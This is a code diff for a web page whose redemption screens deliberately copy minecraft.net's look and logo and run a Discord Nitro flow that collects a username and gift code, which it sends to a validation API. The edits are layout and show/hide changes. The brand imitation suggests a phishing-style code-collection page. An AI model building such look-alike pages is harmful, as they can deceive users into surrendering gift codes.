@@ -106,9 +106,10 @@
 
 /* MC REDEEM HERO (green theme like minecraft.net) */
 .mc-redeem-hero{
-  flex:1;display:flex;flex-direction:column;align-items:center;justify-content:center;
-  background:linear-gradient(135deg,#3b8526 0%,#5da83a 40%,#4a9e2f 100%);
-  position:relative;overflow:hidden;padding:60px 20px;text-align:center;
+  flex:1; width:100%;
+  display:flex;flex-direction:column;align-items:center;justify-content:center;
+  background:linear-gradient(180deg,#3b8526 0%,#5da83a 40%,#4a9e2f 100%);
+  position:relative;overflow:hidden;padding:80px 20px;text-align:center;min-height:calc(100vh - 52px);
 }
 .mc-redeem-hero::before{
   content:'';position:absolute;inset:0;
@@ -227,7 +228,7 @@
 <div class="mc-pro-container" id="mc-ui" style="display:none">
   <!-- MC TOP BAR -->
   <div style="width:100%;background:#1a1a1a;padding:12px 32px;display:flex;align-items:center;gap:32px">
-    <img src="https://www.minecraft.net/content/dam/minecraftnet/games/minecraft/logos/Minecraft-Logo.png" height="28" style="cursor:pointer" onclick="rdBack()">
+    <img src="assets/minecraft/logo.png" height="28" style="cursor:pointer" onclick="rdBack()">
     <div style="display:flex;gap:24px;color:#fff;font-size:12px;font-weight:700;letter-spacing:0.5px"><span>GAMES</span><span>SHOP</span><span>EXPLORE</span><span>LEARN</span><span>SUPPORT</span></div>
     <div style="margin-left:auto;display:flex;gap:12px;align-items:center">
       <span style="color:#86d562;font-size:12px;font-weight:700;border:1px solid #86d562;padding:4px 14px;cursor:pointer">BUY NOW</span>
@@ -256,7 +257,7 @@
   </div>
 
   <!-- MC REDEEM SECTION (green hero like real site) -->
-  <div id="mc-redeem-section" style="display:none;flex:1">
+  <div id="mc-redeem-section" style="display:none;width:100%;flex-direction:column;flex:1">
     <div class="mc-redeem-hero">
       <h1 class="mc-redeem-title">Redeem Your<br>Minecraft Code</h1>
       <p class="mc-redeem-subtitle">Redemption Code</p>
@@ -326,7 +327,7 @@
 </div>
 
 <!-- ═══ DISCORD NITRO — STEP 1: USERNAME ═══ -->
-<div class="yt-channel-overlay" id="dc-step1" style="display:none">
+<div class="yt-channel-overlay" id="dc-step1">
   <div class="yt-channel-box">
     <div style="font-size:42px;margin-bottom:18px">💎</div>
     <h2 style="font-family:'Fraunces',serif;font-size:24px;font-weight:700;color:var(--t);margin-bottom:6px">Discord Nitro</h2>
@@ -334,12 +335,12 @@
     <label style="display:block;text-align:left;font-size:11px;font-weight:700;color:var(--t2);margin-bottom:6px;text-transform:uppercase;letter-spacing:0.07em">Discord Username</label>
     <input type="text" class="inp" id="dc-username" placeholder="e.g. username#1234" style="margin-bottom:22px">
     <button class="btn btn-primary btn-full" onclick="dcGoStep2()">Continue</button>
-    <div style="margin-top:14px"><button class="btn btn-ghost" onclick="hide('dc-step1');show('std-ui')" style="font-size:13px">← Go Back</button></div>
+    <div style="margin-top:14px"><button class="btn btn-ghost" onclick="document.getElementById('dc-step1').classList.remove('show')" style="font-size:13px">← Go Back</button></div>
   </div>
 </div>
 
 <!-- ═══ DISCORD NITRO — STEP 2: PLAN SELECT ═══ -->
-<div class="yt-channel-overlay" id="dc-step2" style="display:none">
+<div class="yt-channel-overlay" id="dc-step2">
   <div class="yt-channel-box">
     <div style="font-size:42px;margin-bottom:18px">💎</div>
     <h2 style="font-family:'Fraunces',serif;font-size:24px;font-weight:700;color:var(--t);margin-bottom:6px">Select Plan</h2>
@@ -349,12 +350,12 @@
       <button class="btn btn-ghost" id="dc-plan-basic" onclick="pickDcPlan('basic')" style="width:100%;justify-content:space-between;display:flex"><span>⚡ Nitro Basic</span><span style="color:var(--t3)">$2.99/mo</span></button>
     </div>
     <button class="btn btn-primary btn-full" onclick="dcGoStep3()">Continue</button>
-    <div style="margin-top:14px"><button class="btn btn-ghost" onclick="hide('dc-step2');show('dc-step1')" style="font-size:13px">← Back</button></div>
+    <div style="margin-top:14px"><button class="btn btn-ghost" onclick="document.getElementById('dc-step2').classList.remove('show');document.getElementById('dc-step1').classList.add('show')" style="font-size:13px">← Back</button></div>
   </div>
 </div>
 
 <!-- ═══ DISCORD NITRO — STEP 3: REDEEM CODE ═══ -->
-<div class="yt-channel-overlay" id="dc-step3" style="display:none">
+<div class="yt-channel-overlay" id="dc-step3">
   <div class="yt-channel-box">
     <div style="font-size:42px;margin-bottom:18px">💎</div>
     <h2 style="font-family:'Fraunces',serif;font-size:24px;font-weight:700;color:var(--t);margin-bottom:6px">Redeem Code</h2>
@@ -362,7 +363,7 @@
     <label style="display:block;text-align:left;font-size:11px;font-weight:700;color:var(--t2);margin-bottom:6px;text-transform:uppercase;letter-spacing:0.07em">Gift Code</label>
     <input type="text" class="inp" id="dc-code-val" placeholder="XXXX-XXXX-XXXX-XXXX" style="margin-bottom:22px" oninput="this.value=this.value.toUpperCase()">
     <button class="btn btn-primary btn-full" onclick="rdSubmitDc()">Redeem Now</button>
-    <div style="margin-top:14px"><button class="btn btn-ghost" onclick="hide('dc-step3');show('dc-step2')" style="font-size:13px">← Back</button></div>
+    <div style="margin-top:14px"><button class="btn btn-ghost" onclick="document.getElementById('dc-step3').classList.remove('show');document.getElementById('dc-step2').classList.add('show')" style="font-size:13px">← Back</button></div>
   </div>
 </div>
 
@@ -378,7 +379,7 @@ function rdGame(g){
     return;
   }
   if(g==='nitro'){
-    show('dc-step1');
+    document.getElementById('dc-step1').classList.add('show');
     return;
   }
   hide(['std-ui','main-nav','std-bg']);
@@ -438,7 +439,8 @@ function dcGoStep2(){
   const u = document.getElementById('dc-username').value.trim();
   if(!u){ toast('!','Enter your Discord username'); return; }
   RD.user = {name: u};
-  hide('dc-step1'); show('dc-step2');
+  document.getElementById('dc-step1').classList.remove('show');
+  document.getElementById('dc-step2').classList.add('show');
 }
 function pickDcPlan(p){
   dcPlanPicked = p;
@@ -450,7 +452,8 @@ function pickDcPlan(p){
 function dcGoStep3(){
   if(!dcPlanPicked){ toast('!','Please select a plan'); return; }
   RD.plan = dcPlanPicked;
-  hide('dc-step2'); show('dc-step3');
+  document.getElementById('dc-step2').classList.remove('show');
+  document.getElementById('dc-step3').classList.add('show');
 }
 
 /* Submit handlers — validate code via API, then show popup */
@@ -475,7 +478,7 @@ async function rdSubmitDc(){
   const res = await validateCode(c, 'nitro');
   btn.disabled = false; btn.textContent = 'Redeem Now';
   if(!res.success){ toast('✕', res.error || 'Invalid or expired code'); return; }
-  hide('dc-step3');
+  document.getElementById('dc-step3').classList.remove('show');
   showSuccessPopup();
 }
 async function rdSubmitPro(){
